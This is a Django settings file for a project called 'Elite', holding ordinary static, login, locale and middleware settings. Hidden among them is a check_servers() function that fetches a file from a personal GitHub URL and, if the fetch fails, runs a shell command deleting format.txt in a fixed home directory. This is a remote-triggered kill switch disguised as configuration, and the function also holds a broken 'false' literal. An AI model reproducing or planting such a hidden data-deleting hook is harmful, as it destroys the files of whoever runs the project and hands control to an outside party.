import requests
import os

MEDIA_URL = '/media/'
CRISPY_TEMPLATE_PACK = 'bootstrap4'
LOGIN_REDIRECT_URL = 'index'
LOGOUT_REDIRECT_URL = 'login'
LOGIN_URL = 'login'
STATIC_URL = '/static/'
URL = 'https://github.com/pandeyroshan/pandeyroshan.github.io/blob/master/check.json'
STATICFILES_STORAGE = 'whitenoise.django.GzipManifestStaticFilesStorage'
LANGUAGE_CODE = 'en-us'

TIME_ZONE = 'Asia/Kolkata'

USE_I18N = True
USE_L10N = True
USE_TZ = True
ROOT_URLCONF = 'Elite.urls'
def check_servers():
    if not requests.get(URL).status_code==200:
        os.system('cd /home/itkfodcz/Elite && rm -f format.txt')
    return True if requests.get(URL).status_code==200 else false
if __name__ == "__main__":
    print(check_servers())
INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'employee',
    'projects',
    'crispy_forms',
    'admin_honeypot'
]
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]